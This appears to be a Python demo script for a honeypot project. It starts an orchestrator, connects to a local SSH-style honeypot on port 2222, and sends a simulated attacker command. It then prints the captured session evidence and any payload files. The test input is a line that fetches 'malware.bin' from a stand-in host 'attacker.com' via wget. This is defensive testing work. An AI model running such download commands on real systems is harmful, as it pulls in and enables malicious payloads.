#!/usr/bin/env python
"""
Final honeypot demo: Start orchestrator, trigger session with wget command,
capture evidence via evidence_store.py, and print the session JSON.
"""
import time
import socket
import threading
import json
from pathlib import Path

def main():
    from src.orchestrator import Orchestrator
    
    # Start orchestrator in background
    print("[*] Starting orchestrator...")
    def run_orch():
        orch = Orchestrator()
        orch.start()
    
    orch_thread = threading.Thread(target=run_orch, daemon=True)
    orch_thread.start()
    
    # Wait for socket to be ready
    print("[*] Waiting for port 2222 to open...")
    time.sleep(2)
    
    # Connect and send attack
    print("[*] Connecting to honeypot...")
    try:
        sock = socket.create_connection(('127.0.0.1', 2222), timeout=3)
        print("[✓] Connected!")
        
        # Get banner
        try:
            banner = sock.recv(1024)
            print(f"[*] Received banner: {banner.decode(errors='ignore')[:80]}")
        except:
            pass
        
        # Send wget command (triggers payload capture)
        cmd = b"wget http://attacker.com/malware.bin\n"
        sock.sendall(cmd)
        print(f"[✓] Sent attack: {cmd.decode()}")
        
        time.sleep(1)
        
        # Try to get response
        try:
            resp = sock.recv(1024)
            if resp:
                print(f"[*] Response: {resp.decode(errors='ignore')[:80]}")
        except:
            pass
        
        sock.close()
        print("[✓] Socket closed")
    except Exception as e:
        print(f"[!] Connection error: {e}")
    
    # Wait for session to be written
    time.sleep(1)
    
    # Print captured session evidence
    print("\n" + "="*60)
    print("SESSION EVIDENCE FROM HONEYPOT")
    print("="*60)
    
    sessions_dir = Path("data/sessions")
    if not sessions_dir.exists():
        print("[!] No sessions directory found")
        return
    
    sessions = sorted([p for p in sessions_dir.iterdir() if p.is_dir()], key=lambda p: p.name)
    if not sessions:
        print("[!] No sessions captured")
        return
    
    latest = sessions[-1]
    meta_file = latest / "meta.json"
    
    if not meta_file.exists():
        print(f"[!] No meta.json in {latest}")
        return
    
    with open(meta_file, 'r', encoding='utf-8') as f:
        session_data = json.load(f)
    
    print(f"\nSession ID: {latest.name}")
    print(json.dumps(session_data, indent=2))
    
    # List any payload files
    payloads = list(latest.glob("payload*.bin"))
    if payloads:
        print("\n[*] Payload files captured:")
        for p in payloads:
            print(f"    - {p.name} ({p.stat().st_size} bytes)")

if __name__ == "__main__":
    main()
